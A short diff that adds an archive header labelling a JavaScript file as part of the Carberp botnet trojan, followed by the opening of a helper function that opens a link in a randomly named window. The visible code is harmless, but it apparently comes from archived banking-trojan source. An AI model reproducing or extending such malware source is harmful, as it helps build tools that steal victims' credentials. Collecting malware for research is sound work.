@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 function get_window (http_link, options) {
 	if (!options) options = {};
 	if(options.name == null) options.name = 'r' + Math.floor( Math.random( ) * (999999 - 1 + 1) ) + 1;
